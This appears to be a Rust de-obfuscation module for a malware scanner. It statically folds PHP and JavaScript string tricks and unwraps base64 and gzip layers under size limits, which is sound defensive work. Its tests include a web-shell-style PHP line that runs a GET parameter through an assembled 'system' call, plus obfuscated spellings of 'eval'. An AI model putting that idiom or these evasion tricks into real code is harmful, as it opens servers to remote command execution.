//! Static de-obfuscation of PHP and JavaScript.
//!
//! Signature rules only see what is written in a file.  Malware therefore
//! hides the interesting parts: function names are assembled from fragments
//! (`'ev'.'al'`, `"\x65val"`, `chr(101)`, `strrev('lave')`), comments are
//! placed between tokens (`eval/**/(`) and the payload is wrapped in several
//! layers of `base64_decode` / `gzinflate` / `str_rot13`.
//!
//! This module undoes those steps **without executing anything**:
//!
//! 1. [`normalize`] strips comments, decodes string escapes, folds
//!    concatenations of literals, `chr()` / `String.fromCharCode()` calls and
//!    decoder calls on short literals.  Strings that only exist after folding
//!    are prefixed with the marker `/*@hidden*/`, so rules can tell
//!    `'system'` from `'sys'.'tem'`.
//! 2. Long literals are decoded: along the decoder chain written in the code
//!    (`gzinflate(base64_decode('…'))`) or, when the decoder is not visible,
//!    by trying Base64 / hex and the three deflate containers.
//! 3. Every decoded payload is processed again (bounded depth and size).
//!
//! The result is a list of [`Layer`]s that the file scanner runs the same
//! rules on.  All work is bounded by [`Limits`]; decompression bombs and
//! deeply nested wrappers end the analysis early instead of exhausting memory.

use regex::bytes::{Captures, Regex};
use std::io::Read;
use std::sync::OnceLock;

/// Marker placed in front of string literals that were assembled by folding.
pub const HIDDEN_MARKER: &str = "/*@hidden*/";

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Lang {
    Php,
    Js,
}

/// Bounds for one file.
#[derive(Debug, Clone, Copy)]
pub struct Limits {
    /// Nesting depth of decoded payloads.
    pub max_depth: u8,
    /// Number of layers returned.
    pub max_layers: usize,
    /// Sum of all layer sizes.
    pub max_total_bytes: usize,
    /// Size of one decompressed payload.
    pub max_payload_bytes: usize,
    /// Literals tried without a visible decoder call.
    pub max_blind_attempts: usize,
    /// Input larger than this is not analysed.
    pub max_input_bytes: usize,
}

impl Default for Limits {
    fn default() -> Self {
        Limits {
            max_depth: 6,
            max_layers: 24,
            max_total_bytes: 8 * 1024 * 1024,
            max_payload_bytes: 4 * 1024 * 1024,
            max_blind_attempts: 24,
            max_input_bytes: 4 * 1024 * 1024,
        }
    }
}

/// One view of the file content after de-obfuscation.
#[derive(Debug, Clone)]
pub struct Layer {
    pub data: Vec<u8>,
    /// How the layer was derived, e.g. `normalisiert` or
    /// `base64_decode → gzinflate`.
    pub chain: String,
    /// 0 for the normalised source, 1+ for decoded payloads.
    pub depth: u8,
    /// `true` for decoded payloads (rules of class `decoded` apply).
    pub decoded: bool,
}

/// Result of [`normalize`].
#[derive(Debug, Default)]
pub struct Normalized {
    pub out: Vec<u8>,
    /// Folding changed something a rule could care about.
    pub interesting: bool,
    /// Ranges (in `out`) of long string literal contents.
    literals: Vec<(usize, usize)>,
}

/// De-obfuscate `data` and return the additional layers to scan.
///
/// PHP files start in HTML mode (text before the first `<?` is copied as
/// it is); decoded payloads without an opening tag are treated as code.
pub fn layers(data: &[u8], lang: Lang, limits: &Limits) -> Vec<Layer> {
    let mut out = Vec::new();
    if data.len() > limits.max_input_bytes {
        return out;
    }
    let mut budget = Budget {
        bytes: limits.max_total_bytes,
        blind: limits.max_blind_attempts,
    };
    process(data, lang, false, 0, "", limits, &mut budget, &mut out);
    out
}

struct Budget {
    bytes: usize,
    blind: usize,
}

#[allow(clippy::too_many_arguments)]
fn process(
    data: &[u8],
    lang: Lang,
    in_code: bool,
    depth: u8,
    chain: &str,
    limits: &Limits,
    budget: &mut Budget,
    out: &mut Vec<Layer>,
) {
    let norm = normalize(data, lang, in_code);
    if norm.interesting && out.len() < limits.max_layers && budget.bytes >= norm.out.len() {
        budget.bytes -= norm.out.len();
        out.push(Layer {
            data: norm.out.clone(),
            chain: if chain.is_empty() {
                "normalisiert".to_string()
            } else {
                format!("{chain} → normalisiert")
            },
            depth,
            decoded: depth > 0,
        });
    }
    if depth >= limits.max_depth {
        return;
    }
    for &(start, end) in &norm.literals {
        if out.len() >= limits.max_layers {
            return;
        }
        let literal = &norm.out[start..end];
        let steps = chain_before(&norm.out, start);
        let decoded = if steps.is_empty() {
            if budget.blind == 0 {
                continue;
            }
            budget.blind -= 1;
            blind_decode(literal, limits)
        } else {
            apply_chain(literal, &steps, limits).map(|d| {
                let names: Vec<&str> = steps.iter().map(|s| s.label()).collect();
                (d, names.join(" → "))
            })
        };
        let Some((payload, label)) = decoded else {
            continue;
        };
        if payload.len() < 8 || payload.len() > budget.bytes {
            continue;
        }
        budget.bytes -= payload.len();
        let full = if chain.is_empty() {
            label
        } else {
            format!("{chain} → {label}")
        };
        out.push(Layer {
            data: payload.clone(),
            chain: full.clone(),
            depth: depth + 1,
            decoded: true,
        });
        // A decoded payload is code handed to eval/assert: no opening tag.
        let code = !contains(&payload, b"<?");
        process(&payload, lang, code, depth + 1, &full, limits, budget, out);
    }
}

fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    find(haystack, 0, needle).is_some()
}

// ---------------------------------------------------------------- normalise

struct StrTok {
    content: Vec<u8>,
    hidden: bool,
}

struct Normalizer<'a> {
    data: &'a [u8],
    lang: Lang,
    out: Vec<u8>,
    cur: Option<StrTok>,
    /// Bytes seen after `cur` (whitespace and, tentatively, the operator).
    after_cur: Vec<u8>,
    concat_pending: bool,
    interesting: bool,
    literals: Vec<(usize, usize)>,
}

/// Bytes that can start a token the normaliser handles.  While a string
/// literal is pending (`pending`), whitespace and the concatenation operator
/// matter as well; otherwise they are copied with everything else.
const fn mark(mut t: [bool; 256], bytes: &[u8]) -> [bool; 256] {
    let mut i = 0;
    while i < bytes.len() {
        t[bytes[i] as usize] = true;
        i += 1;
    }
    t
}

const fn special_table(php: bool, pending: bool) -> [bool; 256] {
    // Quotes, comment starts and the letters that begin `chr(` and
    // `String.fromCharCode(`.
    let mut t = mark([false; 256], b"'\"/");
    t = mark(t, if php { b"#?<cC" } else { b"`S" });
    if pending {
        t = mark(t, b" \t\r\n\x0b\x0c");
        t = mark(t, if php { b"." } else { b"+" });
    }
    t
}

static SPECIAL: [[[bool; 256]; 2]; 2] = [
    [special_table(false, false), special_table(false, true)],
    [special_table(true, false), special_table(true, true)],
];

/// Literals at least this long are candidates for payload decoding.
const MIN_PAYLOAD_LITERAL: usize = 40;

fn is_ident(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

impl<'a> Normalizer<'a> {
    fn flush(&mut self) {
        if let Some(tok) = self.cur.take() {
            if tok.hidden {
                self.out.extend_from_slice(HIDDEN_MARKER.as_bytes());
                self.interesting = true;
            }
            self.out.push(b'\'');
            let start = self.out.len();
            self.out.extend_from_slice(&tok.content);
            let end = self.out.len();
            self.out.push(b'\'');
            if end - start >= MIN_PAYLOAD_LITERAL {
                self.literals.push((start, end));
            }
        }
        self.out.append(&mut self.after_cur);
        self.concat_pending = false;
    }

    fn push_ws(&mut self, b: u8) {
        if self.cur.is_some() {
            self.after_cur.push(b);
        } else {
            self.out.push(b);
        }
    }

    fn push_str(&mut self, content: Vec<u8>, hidden: bool) {
        if self.concat_pending {
            if let Some(cur) = self.cur.as_mut() {
                // Splitting an identifier across two literals has no purpose
                // other than hiding it from a text search.
                let splits_word = cur.content.last().is_some_and(|b| is_ident(*b))
                    && content.first().is_some_and(|b| is_ident(*b));
                cur.hidden |= hidden || splits_word;
                cur.content.extend_from_slice(&content);
                self.after_cur.clear();
                self.concat_pending = false;
                return;
            }
        }
        self.flush();
        self.cur = Some(StrTok { content, hidden });
    }

    fn last_significant(&self) -> Option<u8> {
        if self.cur.is_some() {
            return Some(b'\'');
        }
        self.out
            .iter()
            .rev()
            .copied()
            .find(|b| !b.is_ascii_whitespace())
    }

    fn next_significant(&self, mut i: usize) -> Option<u8> {
        while i < self.data.len() && self.data[i].is_ascii_whitespace() {
            i += 1;
        }
        self.data.get(i).copied()
    }

    /// Comments between tokens of a call are an evasion technique
    /// (`eval/**/(`, `eval(/**/$_POST`); ordinary comments are not.
    fn note_comment(&mut self, start: usize, end: usize, block: bool) {
        let prev = self.last_significant();
        let next = self.next_significant(end);
        let prev_ident = prev.is_some_and(|b| is_ident(b) || b == b'$');
        let before_call = matches!(next, Some(b'(') | Some(b'['));
        let glued = block
            && start > 0
            && is_ident(self.data[start - 1])
            && self.data.get(end).is_some_and(|b| is_ident(*b));
        let after_paren = block
            && prev == Some(b'(')
            && next.is_some_and(|b| b == b'$' || b == b'@')
            && !self.data[start..end].contains(&b'\n');
        if (prev_ident && before_call) || glued || after_paren {
            self.interesting = true;
        }
    }

    fn run(&mut self, in_code: bool) {
        let d = self.data;
        let n = d.len();
        let php = self.lang == Lang::Php;
        let mut i = 0usize;
        let mut code = in_code || !php;
        while i < n {
            if !code {
                // HTML mode: copy verbatim up to the next opening tag.
                match find(d, i, b"<?") {
                    Some(p) => {
                        self.out.extend_from_slice(&d[i..p + 2]);
                        i = p + 2;
                        if d[i..].len() >= 3 && d[i..i + 3].eq_ignore_ascii_case(b"php") {
                            self.out.extend_from_slice(&d[i..i + 3]);
                            i += 3;
                        } else if d.get(i) == Some(&b'=') {
                            self.out.push(b'=');
                            i += 1;
                        } else if d[i..].len() >= 3 && d[i..i + 3].eq_ignore_ascii_case(b"xml") {
                            continue;
                        }
                        code = true;
                    }
                    None => {
                        self.out.extend_from_slice(&d[i..]);
                        i = n;
                    }
                }
                continue;
            }
            // Fast path: copy everything up to the next byte that can start
            // a token the normaliser cares about.
            let special = &SPECIAL[php as usize][self.cur.is_some() as usize];
            let mut run = i;
            while run < n && !special[d[run] as usize] {
                run += 1;
            }
            if run > i {
                self.flush();
                self.out.extend_from_slice(&d[i..run]);
                i = run;
                continue;
            }
            let c = d[i];
            if c.is_ascii_whitespace() {
                self.push_ws(c);
                i += 1;
                continue;
            }
            if php && c == b'?' && d.get(i + 1) == Some(&b'>') {
                self.flush();
                self.out.extend_from_slice(b"?>");
                i += 2;
                code = false;
                continue;
            }
            // ---- comments
            if c == b'/' && d.get(i + 1) == Some(&b'*') {
                let end = find(d, i + 2, b"*/").map(|p| p + 2).unwrap_or(n);
                self.note_comment(i, end, true);
                self.push_ws(b' ');
                i = end;
                continue;
            }
            let line_comment = (c == b'/' && d.get(i + 1) == Some(&b'/'))
                || (php && c == b'#' && d.get(i + 1) != Some(&b'['));
            if line_comment {
                let mut end = i;
                while end < n && d[end] != b'\n' {
                    if php && d[end] == b'?' && d.get(end + 1) == Some(&b'>') {
                        break;
                    }
                    end += 1;
                }
                self.note_comment(i, end, false);
                self.push_ws(b' ');
                i = end;
                continue;
            }
            // ---- strings
            if c == b'\'' || c == b'"' || (!php && c == b'`') {
                match self.read_string(i) {
                    Some((content, hidden, next)) => {
                        self.push_str(content, hidden);
                        i = next;
                    }
                    None => {
                        self.flush();
                        self.out.push(c);
                        i += 1;
                    }
                }
                continue;
            }
            if php && c == b'<' && d[i..].starts_with(b"<<<") {
                if let Some((content, next)) = read_heredoc(d, i) {
                    self.push_str(content, false);
                    i = next;
                    continue;
                }
            }
            // ---- single characters built by a call
            let at_word = i == 0 || !(is_ident(d[i - 1]) || d[i - 1] == b'$' || d[i - 1] == b'>');
            if at_word && (c == b'c' || c == b'C' || c == b'S') {
                let built = if php {
                    read_chr(d, i)
                } else {
                    read_from_char_code(d, i)
                };
                if let Some((content, next)) = built {
                    self.push_str(content, true);
                    i = next;
                    continue;
                }
            }
            // ---- concatenation
            let op = if php { b'.' } else { b'+' };
            if c == op
                && self.cur.is_some()
                && !self.concat_pending
                && d.get(i + 1) != Some(&b'=')
                && d.get(i + 1) != Some(&op)
            {
                self.concat_pending = true;
                self.after_cur.push(c);
                i += 1;
                continue;
            }
            self.flush();
            self.out.push(c);
            i += 1;
        }
        self.flush();
    }

    /// Read a quoted string starting at `i`.  Returns the decoded content,
    /// whether decoding revealed letters written as escapes, and the index
    /// after the closing quote.
    fn read_string(&self, i: usize) -> Option<(Vec<u8>, bool, usize)> {
        let d = self.data;
        let quote = d[i];
        let php = self.lang == Lang::Php;
        let raw = php && quote == b'\'';
        let mut content = Vec::new();
        let mut hidden = false;
        let mut j = i + 1;
        while j < d.len() {
            // Copy the run up to the next quote, backslash or line end.
            let run = d[j..]
                .iter()
                .position(|b| *b == quote || *b == b'\\' || *b == b'\n')
                .unwrap_or(d.len() - j);
            if run > 0 {
                content.extend_from_slice(&d[j..j + run]);
                j += run;
                continue;
            }
            let b = d[j];
            if b == quote {
                return Some((content, hidden, j + 1));
            }
            if !php && quote != b'`' && b == b'\n' {
                // A JavaScript string cannot span lines: this quote belongs
                // to a regex literal or to text.
                return None;
            }
            if b != b'\\' || j + 1 >= d.len() {
                content.push(b);
                j += 1;
                continue;
            }
            let e = d[j + 1];
            if raw {
                if e == b'\'' || e == b'\\' {
                    content.push(e);
                } else {
                    content.push(b'\\');
                    content.push(e);
                }
                j += 2;
                continue;
            }
            match e {
                b'x' | b'X' => {
                    let digits = hex_run(d, j + 2, 2);
                    if digits == 0 {
                        content.extend_from_slice(&d[j..j + 2]);
                        j += 2;
                    } else {
                        let v = parse_radix(&d[j + 2..j + 2 + digits], 16) as u8;
                        hidden |= v.is_ascii_alphanumeric() || v == b'_';
                        content.push(v);
                        j += 2 + digits;
                    }
                }
                b'u' => {
                    let (value, len) = if d.get(j + 2) == Some(&b'{') {
                        let digits = hex_run(d, j + 3, 6);
                        if digits > 0 && d.get(j + 3 + digits) == Some(&b'}') {
                            (Some(parse_radix(&d[j + 3..j + 3 + digits], 16)), digits + 4)
                        } else {
                            (None, 2)
                        }
                    } else if !php && hex_run(d, j + 2, 4) == 4 {
                        (Some(parse_radix(&d[j + 2..j + 6], 16)), 6)
                    } else {
                        (None, 2)
                    };
                    match value.and_then(char::from_u32) {
                        Some(ch) => {
                            hidden |= ch.is_ascii_alphanumeric() || ch == '_';
                            let mut buf = [0u8; 4];
                            content.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
                        }
                        None => content.extend_from_slice(&d[j..j + len]),
                    }
                    j += len;
                }
                b'0'..=b'7' if php => {
                    let mut digits = 0;
                    while digits < 3
                        && d.get(j + 1 + digits)
                            .is_some_and(|b| (b'0'..=b'7').contains(b))
                    {
                        digits += 1;
                    }
                    let v = parse_radix(&d[j + 1..j + 1 + digits], 8) as u8;
                    hidden |= v.is_ascii_alphanumeric() || v == b'_';
                    content.push(v);
                    j += 1 + digits;
                }
                b'n' => {
                    content.push(b'\n');
                    j += 2;
                }
                b't' => {
                    content.push(b'\t');
                    j += 2;
                }
                b'r' => {
                    content.push(b'\r');
                    j += 2;
                }
                _ => {
                    if php && e != b'\\' && e != b'"' && e != b'$' {
                        content.push(b'\\');
                    }
                    content.push(e);
                    j += 2;
                }
            }
        }
        None
    }
}

/// Position of `needle` in `data` at or after `from`.
fn find(data: &[u8], from: usize, needle: &[u8]) -> Option<usize> {
    let first = *needle.first()?;
    let mut i = from;
    while i + needle.len() <= data.len() {
        // `position` on a byte slice is vectorised by the standard library.
        let p = data[i..=data.len() - needle.len()]
            .iter()
            .position(|b| *b == first)?;
        i += p;
        if &data[i..i + needle.len()] == needle {
            return Some(i);
        }
        i += 1;
    }
    None
}

fn hex_run(d: &[u8], from: usize, max: usize) -> usize {
    let mut n = 0;
    while n < max && d.get(from + n).is_some_and(|b| b.is_ascii_hexdigit()) {
        n += 1;
    }
    n
}

fn parse_radix(digits: &[u8], radix: u32) -> u32 {
    digits.iter().fold(0u32, |acc, b| {
        acc.wrapping_mul(radix)
            .wrapping_add((*b as char).to_digit(radix).unwrap_or(0))
    })
}

fn skip_ws(d: &[u8], mut i: usize) -> usize {
    while i < d.len() && d[i].is_ascii_whitespace() {
        i += 1;
    }
    i
}

/// Parse an integer literal (decimal or `0x…`); returns value and next index.
fn read_int(d: &[u8], i: usize) -> Option<(u32, usize)> {
    if d.get(i) == Some(&b'0') && matches!(d.get(i + 1), Some(b'x') | Some(b'X')) {
        let digits = hex_run(d, i + 2, 6);
        if digits == 0 {
            return None;
        }
        return Some((parse_radix(&d[i + 2..i + 2 + digits], 16), i + 2 + digits));
    }
    let mut j = i;
    while j < d.len() && d[j].is_ascii_digit() && j - i < 7 {
        j += 1;
    }
    if j == i {
        return None;
    }
    Some((parse_radix(&d[i..j], 10), j))
}

/// `chr(101)` → `e`.
fn read_chr(d: &[u8], i: usize) -> Option<(Vec<u8>, usize)> {
    if d.len() < i + 3 || !d[i..i + 3].eq_ignore_ascii_case(b"chr") {
        return None;
    }
    let mut j = skip_ws(d, i + 3);
    if d.get(j) != Some(&b'(') {
        return None;
    }
    j = skip_ws(d, j + 1);
    let (value, next) = read_int(d, j)?;
    j = skip_ws(d, next);
    if d.get(j) != Some(&b')') {
        return None;
    }
    Some((vec![(value % 256) as u8], j + 1))
}

/// `String.fromCharCode(101, 118)` → `ev`.
fn read_from_char_code(d: &[u8], i: usize) -> Option<(Vec<u8>, usize)> {
    const NAME: &[u8] = b"String.fromCharCode";
    if !d[i..].starts_with(NAME) {
        return None;
    }
    let mut j = skip_ws(d, i + NAME.len());
    if d.get(j) != Some(&b'(') {
        return None;
    }
    let mut text = String::new();
    loop {
        j = skip_ws(d, j + 1);
        let (value, next) = read_int(d, j)?;
        text.push(char::from_u32(value)?);
        j = skip_ws(d, next);
        match d.get(j) {
            Some(b',') => continue,
            Some(b')') => return Some((text.into_bytes(), j + 1)),
            _ => return None,
        }
    }
}

/// `<<<EOT … EOT` and `<<<'EOT' … EOT`.
fn read_heredoc(d: &[u8], i: usize) -> Option<(Vec<u8>, usize)> {
    let mut j = i + 3;
    while d.get(j) == Some(&b' ') {
        j += 1;
    }
    let quoted = matches!(d.get(j), Some(b'\'') | Some(b'"'));
    if quoted {
        j += 1;
    }
    let start = j;
    while j < d.len() && is_ident(d[j]) {
        j += 1;
    }
    if j == start || j - start > 64 {
        return None;
    }
    let label = &d[start..j];
    if quoted {
        j += 1;
    }
    if d.get(j) == Some(&b'\r') {
        j += 1;
    }
    if d.get(j) != Some(&b'\n') {
        return None;
    }
    let body = j + 1;
    let mut line = body;
    loop {
        let indent = skip_inline_ws(d, line);
        if d[indent..].starts_with(label)
            && !d.get(indent + label.len()).is_some_and(|b| is_ident(*b))
        {
            let end = line.saturating_sub(1).max(body);
            return Some((d[body..end].to_vec(), indent + label.len()));
        }
        line = find(d, line, b"\n")? + 1;
        if line >= d.len() {
            return None;
        }
    }
}

fn skip_inline_ws(d: &[u8], mut i: usize) -> usize {
    while i < d.len() && (d[i] == b' ' || d[i] == b'\t') {
        i += 1;
    }
    i
}

/// Strip comments, decode escapes and fold constant string expressions.
pub fn normalize(data: &[u8], lang: Lang, in_code: bool) -> Normalized {
    let mut n = Normalizer {
        data,
        lang,
        out: Vec::with_capacity(data.len()),
        cur: None,
        after_cur: Vec::new(),
        concat_pending: false,
        interesting: false,
        literals: Vec::new(),
    };
    n.run(in_code);
    let mut norm = Normalized {
        out: n.out,
        interesting: n.interesting,
        literals: n.literals,
    };
    fold_decoder_calls(&mut norm);
    norm
}

fn decoder_call_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(?i-u)\b(strrev|str_rot13|base64_decode|hex2bin|urldecode|rawurldecode|atob|unescape|decodeURIComponent)\s*\(\s*(?:/\*@hidden\*/)?'([^'\\]{2,200})'\s*\)",
        )
        .expect("valid regex")
    })
}

fn reverse_join_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(?-u)(?:/\*@hidden\*/)?'([^'\\]{2,200})'\s*\.\s*split\s*\(\s*''\s*\)\s*\.\s*reverse\s*\(\s*\)\s*\.\s*join\s*\(\s*''\s*\)",
        )
        .expect("valid regex")
    })
}

fn hidden_literal(text: &[u8]) -> Option<Vec<u8>> {
    // Only text is worth folding back into the source.
    if text.is_empty() || !text.iter().all(|b| (0x20..0x7f).contains(b) && *b != b'\'') {
        return None;
    }
    let mut v = HIDDEN_MARKER.as_bytes().to_vec();
    v.push(b'\'');
    v.extend_from_slice(text);
    v.push(b'\'');
    Some(v)
}

/// `strrev('metsys')` → `/*@hidden*/'system'`.  Only short literals are
/// folded in place; long ones become separate layers.
fn fold_decoder_calls(norm: &mut Normalized) {
    let mut changed = false;
    let call = decoder_call_regex();
    for _ in 0..6 {
        // The alternation of function names gives the regex a literal
        // prefilter: files without a decoder call cost one fast pass.
        if !call.is_match(&norm.out) {
            break;
        }
        let mut hit = false;
        let replaced = call.replace_all(&norm.out, |caps: &Captures| {
            let folded = Step::parse(&caps[1])
                .and_then(|s| s.apply(&caps[2], 4096))
                .and_then(|text| hidden_literal(&text));
            match folded {
                Some(v) => {
                    hit = true;
                    v
                }
                None => caps[0].to_vec(),
            }
        });
        if !hit {
            break;
        }
        norm.out = replaced.into_owned();
        changed = true;
    }
    if contains(&norm.out, b".reverse") || contains(&norm.out, b". reverse") {
        let mut hit = false;
        let replaced = reverse_join_regex().replace_all(&norm.out, |caps: &Captures| {
            let reversed: Vec<u8> = caps[1].iter().rev().copied().collect();
            match hidden_literal(&reversed) {
                Some(v) => {
                    hit = true;
                    v
                }
                None => caps[0].to_vec(),
            }
        });
        if hit {
            norm.out = replaced.into_owned();
            changed = true;
        }
    }
    if changed {
        norm.interesting = true;
        // Offsets moved; long literals are located again.
        norm.literals = locate_literals(&norm.out);
    }
}

fn locate_literals(out: &[u8]) -> Vec<(usize, usize)> {
    static RE: OnceLock<Regex> = OnceLock::new();
    let re = RE.get_or_init(|| Regex::new(r"(?-u)'([^'\\\s]{40,})'").expect("valid regex"));
    re.captures_iter(out)
        .filter_map(|c| c.get(1))
        .map(|m| (m.start(), m.end()))
        .collect()
}

// ---------------------------------------------------------------- decoding

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Step {
    Base64,
    RawInflate,
    Zlib,
    Gzip,
    Rot13,
    Rev,
    Hex,
    Url,
    Identity,
}

impl Step {
    fn parse(name: &[u8]) -> Option<Step> {
        let lower = name.to_ascii_lowercase();
        Some(match lower.as_slice() {
            b"base64_decode" | b"atob" => Step::Base64,
            b"gzinflate" => Step::RawInflate,
            b"gzuncompress" => Step::Zlib,
            b"gzdecode" => Step::Gzip,
            b"str_rot13" => Step::Rot13,
            b"strrev" => Step::Rev,
            b"hex2bin" => Step::Hex,
            b"urldecode" | b"rawurldecode" | b"unescape" | b"decodeuricomponent" => Step::Url,
            b"stripslashes" | b"trim" | b"stripcslashes" => Step::Identity,
            _ => return None,
        })
    }

    fn label(self) -> &'static str {
        match self {
            Step::Base64 => "base64_decode",
            Step::RawInflate => "gzinflate",
            Step::Zlib => "gzuncompress",
            Step::Gzip => "gzdecode",
            Step::Rot13 => "str_rot13",
            Step::Rev => "strrev",
            Step::Hex => "hex2bin",
            Step::Url => "urldecode",
            Step::Identity => "trim",
        }
    }

    fn apply(self, input: &[u8], limit: usize) -> Option<Vec<u8>> {
        match self {
            Step::Base64 => base64_decode(input),
            Step::RawInflate => inflate(flate2::read::DeflateDecoder::new(input), limit),
            Step::Zlib => inflate(flate2::read::ZlibDecoder::new(input), limit),
            Step::Gzip => inflate(flate2::read::GzDecoder::new(input), limit),
            Step::Rot13 => Some(input.iter().map(|b| rot13(*b)).collect()),
            Step::Rev => Some(input.iter().rev().copied().collect()),
            Step::Hex => hex_decode(input),
            Step::Url => Some(url_decode(input)),
            Step::Identity => Some(input.to_vec()),
        }
    }
}

/// Decoder calls wrapped around the literal starting at `start`, innermost
/// first: `gzinflate(base64_decode('…'))` → `[Base64, RawInflate]`.
fn chain_before(out: &[u8], start: usize) -> Vec<Step> {
    let mut steps = Vec::new();
    // `start` is the first content byte; the quote is before it.
    let mut i = start.saturating_sub(1);
    if out[..i].ends_with(HIDDEN_MARKER.as_bytes()) {
        i -= HIDDEN_MARKER.len();
    }
    loop {
        while i > 0 && out[i - 1].is_ascii_whitespace() {
            i -= 1;
        }
        if i == 0 || out[i - 1] != b'(' {
            break;
        }
        i -= 1;
        while i > 0 && out[i - 1].is_ascii_whitespace() {
            i -= 1;
        }
        let end = i;
        while i > 0 && is_ident(out[i - 1]) {
            i -= 1;
        }
        match Step::parse(&out[i..end]) {
            Some(step) if steps.len() < 16 => steps.push(step),
            _ => break,
        }
    }
    if steps.iter().all(|s| *s == Step::Identity) {
        steps.clear();
    }
    steps
}

fn apply_chain(literal: &[u8], steps: &[Step], limits: &Limits) -> Option<Vec<u8>> {
    let mut data = literal.to_vec();
    for step in steps {
        data = step.apply(&data, limits.max_payload_bytes)?;
    }
    Some(data)
}

/// Decode a literal whose decoder is not written next to it.
fn blind_decode(literal: &[u8], limits: &Limits) -> Option<(Vec<u8>, String)> {
    let limit = limits.max_payload_bytes;
    let (raw, label) = if literal.len() % 2 == 0 && literal.iter().all(|b| b.is_ascii_hexdigit()) {
        (hex_decode(literal)?, "hex2bin")
    } else if literal
        .iter()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
    {
        (base64_decode(literal)?, "base64_decode")
    } else {
        return None;
    };
    if mostly_text(&raw) {
        return Some((raw, label.to_string()));
    }
    for step in [Step::RawInflate, Step::Zlib, Step::Gzip] {
        if let Some(inflated) = step.apply(&raw, limit) {
            if inflated.len() >= 16 && mostly_text(&inflated) {
                return Some((inflated, format!("{label} → {}", step.label())));
            }
        }
    }
    // Reversed Base64 (`strrev`) decodes to text when read backwards.
    if label == "base64_decode" {
        let reversed: Vec<u8> = literal.iter().rev().copied().collect();
        if let Some(text) = base64_decode(&reversed).filter(|t| looks_like_code(t)) {
            return Some((text, "strrev → base64_decode".to_string()));
        }
    }
    None
}

fn mostly_text(data: &[u8]) -> bool {
    if data.len() < 16 {
        return false;
    }
    let printable = data
        .iter()
        .filter(|b| (0x20..0x7f).contains(*b) || matches!(b, b'\n' | b'\r' | b'\t'))
        .count();
    printable * 100 >= data.len() * 92
}

fn looks_like_code(data: &[u8]) -> bool {
    mostly_text(data) && (contains(data, b"(") && (contains(data, b";") || contains(data, b"$")))
}

fn rot13(b: u8) -> u8 {
    match b {
        b'a'..=b'z' => (b - b'a' + 13) % 26 + b'a',
        b'A'..=b'Z' => (b - b'A' + 13) % 26 + b'A',
        _ => b,
    }
}

/// Lenient Base64 like PHP's `base64_decode`: characters outside the
/// alphabet are skipped, padding is optional.
pub fn base64_decode(input: &[u8]) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(input.len() * 3 / 4);
    let mut acc = 0u32;
    let mut bits = 0u32;
    let mut symbols = 0usize;
    for &b in input {
        let v = match b {
            b'A'..=b'Z' => b - b'A',
            b'a'..=b'z' => b - b'a' + 26,
            b'0'..=b'9' => b - b'0' + 52,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            _ => continue,
        };
        symbols += 1;
        acc = (acc << 6) | v as u32;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
            acc &= (1 << bits) - 1;
        }
    }
    if symbols < 4 || symbols * 2 < input.len() {
        return None;
    }
    Some(out)
}

fn hex_decode(input: &[u8]) -> Option<Vec<u8>> {
    if input.len() % 2 != 0 || input.is_empty() {
        return None;
    }
    input
        .chunks(2)
        .map(|pair| {
            let hi = (pair[0] as char).to_digit(16)?;
            let lo = (pair[1] as char).to_digit(16)?;
            Some((hi * 16 + lo) as u8)
        })
        .collect()
}

fn url_decode(input: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(input.len());
    let mut i = 0;
    while i < input.len() {
        if input[i] == b'%' && hex_run(input, i + 1, 2) == 2 {
            out.push(parse_radix(&input[i + 1..i + 3], 16) as u8);
            i += 3;
        } else {
            out.push(if input[i] == b'+' { b' ' } else { input[i] });
            i += 1;
        }
    }
    out
}

/// Decompress at most `limit` bytes; a longer stream is a failure, so a
/// decompression bomb never becomes a layer.
fn inflate(reader: impl Read, limit: usize) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    let mut limited = reader.take(limit as u64 + 1);
    limited.read_to_end(&mut out).ok()?;
    if out.is_empty() || out.len() > limit {
        return None;
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::write::{DeflateEncoder, ZlibEncoder};
    use flate2::Compression;
    use std::io::Write;

    fn norm(src: &str) -> String {
        String::from_utf8_lossy(&normalize(src.as_bytes(), Lang::Php, false).out).into_owned()
    }

    fn b64(data: &[u8]) -> String {
        const T: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in data.chunks(3) {
            let n = (chunk[0] as u32) << 16
                | (*chunk.get(1).unwrap_or(&0) as u32) << 8
                | *chunk.get(2).unwrap_or(&0) as u32;
            out.push(T[(n >> 18) as usize & 63] as char);
            out.push(T[(n >> 12) as usize & 63] as char);
            out.push(if chunk.len() > 1 {
                T[(n >> 6) as usize & 63] as char
            } else {
                '='
            });
            out.push(if chunk.len() > 2 {
                T[n as usize & 63] as char
            } else {
                '='
            });
        }
        out
    }

    fn deflate(data: &[u8]) -> Vec<u8> {
        let mut e = DeflateEncoder::new(Vec::new(), Compression::default());
        e.write_all(data).unwrap();
        e.finish().unwrap()
    }

    #[test]
    fn folds_concatenation_and_marks_split_words() {
        let n = norm("<?php $f = 'sys' . 'tem'; $f($_GET['c']);");
        assert!(n.contains("/*@hidden*/'system'"), "{n}");
        // A sentence continued on the next line is not hiding anything.
        let n = norm("<?php $s = 'Hello ' . 'world';");
        assert!(n.contains("'Hello world'") && !n.contains("@hidden"), "{n}");
    }

    #[test]
    fn decodes_escapes_and_chr() {
        let n =
            norm(r#"<?php $a = "\x65\x76\x61\x6c"; $b = "\145val"; $c = chr(101).chr(0x76)."al";"#);
        assert_eq!(n.matches("/*@hidden*/'eval'").count(), 3, "{n}");
        // Escapes that are not letters stay unmarked.
        let n = norm(r#"<?php echo "line\n";"#);
